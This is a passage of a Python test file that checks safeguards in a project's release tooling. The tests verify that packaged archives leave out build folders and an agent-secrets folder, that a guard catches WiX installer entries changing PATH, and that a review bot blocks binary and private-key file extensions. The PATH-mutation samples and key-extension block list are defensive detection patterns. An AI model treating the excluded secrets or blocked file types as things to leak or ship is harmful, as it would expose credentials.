        spec = importlib.util.spec_from_file_location("ao_pkg_mod_bva", pkg_script)
        self.assertIsNotNone(spec)
        self.assertIsNotNone(spec.loader)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)

        with tempfile.TemporaryDirectory(prefix="ao_pkg_bva_") as tmpdir:
            root = Path(tmpdir)
            (root / "formal" / ".lake" / "packages").mkdir(parents=True)
            (root / "formal" / ".lake" / "packages" / "foo.olean").write_text("bin", encoding="utf-8")
            (root / ".lake").mkdir()
            (root / ".lake" / "junk.olean").write_text("bin", encoding="utf-8")
            (root / "target" / "debug").mkdir(parents=True)
            (root / "target" / "debug" / "octopus.exe").write_text("bin", encoding="utf-8")
            (root / ".agents").mkdir()
            (root / ".agents" / "secret.md").write_text("meta", encoding="utf-8")
            (root / "formal" / "AgentOctopusFormal").mkdir(parents=True)
            (root / "formal" / "AgentOctopusFormal" / "CoreTypes.lean").write_text("-- ok\n", encoding="utf-8")

            old_root = mod.REPO_ROOT
            tmp_zip = root / "out.zip"
            try:
                mod.REPO_ROOT = root
                ok = mod.package_agent_octopus(output_zip=tmp_zip)
                self.assertTrue(ok)
            finally:
                mod.REPO_ROOT = old_root

            with zipfile.ZipFile(tmp_zip, "r") as zf:
                entries = [n.replace("\\", "/") for n in zf.namelist()]
            self.assertIn("formal/AgentOctopusFormal/CoreTypes.lean", entries)
            for forbidden_tok in (".lake", "target/", ".agents"):
                self.assertFalse(
                    any(forbidden_tok in e for e in entries),
                    f"Forbidden {forbidden_tok} leaked into archive: {entries}",
                )

            # Negative control: removing ".lake" from EXCLUDE_DIRS exposes non-build .lake files
            saved_excl = set(mod.EXCLUDE_DIRS)
            leak_zip = root / "leak.zip"
            try:
                mod.EXCLUDE_DIRS = saved_excl - {".lake"}
                mod.REPO_ROOT = root
                self.assertTrue(mod.package_agent_octopus(output_zip=leak_zip))
            finally:
                mod.EXCLUDE_DIRS = saved_excl
                mod.REPO_ROOT = old_root
            with zipfile.ZipFile(leak_zip, "r") as zf:
                leaked = [n.replace("\\", "/") for n in zf.namelist()]
            self.assertIn(".lake/junk.olean", leaked)
            self.assertIn("formal/.lake/packages/foo.olean", leaked)

    def test_f14_b02_wix_path_mutation_pattern_catches_environment_tag(self) -> None:
        """F14-BVA: WiX PATH guard detects Id=\"PATH\", Id='PATH', and Name=\"PATH\"."""
        for bad_wxs in (
            '<Component><Environment Id="PATH" Value="[INSTALLFOLDER]" Permanent="no" /></Component>',
            "<Component><Environment Id='PATH' Value='[INSTALLFOLDER]' Permanent='no' /></Component>",
            '<Component><Environment Id="EnvVar" Name="PATH" Value="[INSTALLFOLDER]" /></Component>',
        ):
            self.assertGreaterEqual(
                len(common.check_wix_path_mutation(bad_wxs)),
                1,
                f"WiX PATH guard missed: {bad_wxs}",
            )

    def test_f14_b03_auto_review_bot_blocks_binary_and_key_extensions(self) -> None:
        """F14-BVA: auto-review-bot.yml Invariant 1 rejects .exe/.dll/.sys/.msi/.pem/.pfx/.key/.p12."""
        bot_yml = _read_repo_text(".github/workflows/auto-review-bot.yml")
        for ext in ("exe", "dll", "sys", "msi", "pem", "pfx", "key", "p12"):
            self.assertIn(ext, bot_yml)

    def test_f14_b04_gitignore_ignores_lake_build_and_zip_probes(self) -> None:
        """F14-BVA: git check-ignore confirms .lake/, formal/.lake/, formal/build/, and *.zip are ignored."""
        for probe in (
            ".lake/tmp",
            "formal/.lake/build/lib/CoreTypes.olean",
            "formal/build/tmp",
            "agent_octopus_source_code.zip",
        ):
            self.assertTrue(common.git_check_ignore(probe), f"Expected gitignore to ignore {probe}")

    def test_f14_b05_repo_boundary_rejects_parent_folder(self) -> None:
        """F14-BVA: Repo boundary check distinguishes d:/harfile/AgentOctopus from parent d:/harfile."""
        parent = common.REPO_ROOT.parent
        self.assertNotEqual(parent.resolve(), common.REPO_ROOT.resolve())
        self.assertEqual(common.REPO_ROOT.name, "AgentOctopus")
